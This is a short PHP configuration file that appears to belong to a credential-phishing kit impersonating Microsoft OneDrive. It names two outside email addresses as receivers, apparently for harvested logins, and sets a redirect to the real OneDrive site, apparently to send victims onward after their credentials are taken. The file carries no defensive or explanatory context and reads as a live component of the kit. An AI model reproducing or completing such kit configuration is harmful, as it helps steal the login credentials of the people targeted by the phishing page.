<?php 
$Receive_email="lart09@yahoo.com,sylvestermandrell@yandex.com";
$redirect="https://www.onedrive.com/";
?>